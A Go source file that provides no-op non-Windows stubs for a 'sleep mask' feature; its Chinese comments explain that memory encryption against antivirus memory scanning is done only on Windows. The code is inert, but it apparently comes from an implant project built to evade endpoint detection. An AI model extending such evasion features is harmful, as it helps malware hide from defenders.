//go:build !windows

package main

import "time"

// 非 Windows 平台的 sleep mask stub：Linux/macOS 上不做内存加密（那边的查杀模型与
// Windows 内存扫描差异很大，且本项目暂未实现），保持行为与之前完全一致。

// sleepMaskHook 由 main.go 注册（非 Windows 下不会被调用）。
var sleepMaskHook func(encrypt bool)

func initSleepMask() {}

func registerSecret(label string, buf []byte) {}

func maskBufferInPlace(buf []byte) {}

// maskIfMaskedCopy 非 Windows 不加密，直接返回原缓冲。
func maskIfMaskedCopy(buf []byte) []byte { return buf }

func ensureUnmasked() {}

func maskedSleep(d time.Duration) {
	if d > 0 {
		time.Sleep(d)
	}
}
